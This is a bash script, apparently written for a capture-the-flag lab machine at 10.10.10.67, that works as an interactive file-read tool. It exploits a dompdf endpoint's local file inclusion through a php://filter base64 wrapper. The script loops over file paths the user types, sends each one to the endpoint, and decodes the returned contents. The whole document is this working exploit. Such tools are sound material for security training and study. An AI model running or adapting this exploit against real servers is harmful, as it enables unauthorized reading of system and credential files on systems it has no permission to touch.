#!/bin/bash

function def_handler(){
	echo -e "\n\n[!]Saindo...\n\n"
	exit 1
}

# Ctrl + C
trap def_handler INT

# Varible_Globals
main_url="http://10.10.10.67/dompdf/dompdf.php"
burp="http://127.0.0.1:8080"

while true; do
	echo -n "#> " && read -r command
	curl -s -G "$main_url" -d "input_file=php://filter/read=convert.base64-encode/resource=$command" | grep -oP "\(.*?\)" | egrep -i -v "DOMPDF|D:" | tr -d "()" | base64 -d; echo
done
